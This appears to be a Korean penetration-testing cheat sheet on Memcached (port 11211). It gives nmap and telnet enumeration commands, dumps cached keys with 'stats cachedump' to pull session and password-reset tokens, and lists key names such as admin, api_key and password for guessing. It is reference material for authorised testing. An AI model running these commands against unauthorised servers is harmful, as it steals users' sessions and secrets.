---
sidebar_position: 3
title: Memcached (Port 11211)
---

# Memcached (Port 11211) 취약점 진단

## Overview

**Memcached**: 고성능 분산 메모리 객체 캐싱 시스템. 데이터베이스 부하를 줄이기 위해 사용됨.
- **주요 포트**: 11211/TCP, 11211/UDP
- **특징**: 기본적으로 인증(Authentication) 기능 없이 텍스트/바이너리 프로토콜로 작동하여, 내부망에 노출 시 민감 정보 유출 및 DDoS 증폭 공격에 활용될 수 있음

---

## 1. Reconnaissance

### 서비스 스캔 및 상태 확인
```bash
# [Nmap] TCP/UDP 포트 오픈 여부 및 memcached-info 스크립트 실행
sudo nmap -p 11211 -sV -sU -sS --script memcached-info <target>

# 모든 Memcached 관련 NSE 스크립트 실행
sudo nmap -p 11211 --script "memcached-*" <target>
```

### 서버 접속 및 기본 통계 열거
```bash
# Telnet을 이용한 평문 접속
telnet <target> 11211

# [연결 후] 기본 통계 정보 (버전, 연결 수, 메모리 등) 확인
stats
stats items
stats slabs
stats sizes
```

---

## 2. Exploitation

### 인증 없는 접근 및 캐시 데이터 덤프
인증 설정(SASL)이 되어 있지 않은 경우 캐시된 애플리케이션 데이터(세션, 패스워드 리셋 토큰 등)를 무단으로 추출 가능

```bash
# 1. Slab ID 확인
stats items
# 응답 예시: STAT items:1:number 5

# 2. 특정 Slab(예: 1)에서 전체(0) 또는 N개의 항목 캐시 키 덤프
stats cachedump 1 0
stats cachedump 1 100
# 응답 예시: ITEM session_token_xyz [32 b; 1519734962 s]

# 3. 획득한 키(Key)를 이용해 실제 데이터 값(Value) 추출
get session_token_xyz
```

### 자동화 도구(memcached-cli) 활용
명령줄에서 좀 더 편하게 Memcached를 제어
```bash
# 설치 (Node.js 환경)
npm install -g memcached-cli

# 연결
memcached-cli <target>:11211

# SASL 인증이 걸려있는 경우
memcached-cli <user>:<pass>@<target>:11211
```

---

## 3. Advanced Techniques

### 주요 타겟 캐시 키(Key) 브루트포스
캐시 덤프로 키 목록이 보이지 않더라도 응용 프로그램에서 널리 쓰이는 키 이름을 직접 요청하여 정보 획득 시도
```bash
# 애플리케이션에서 주로 저장하는 키 쿼리
get session
get user
get admin
get token
get api_key
get password
get secret
```

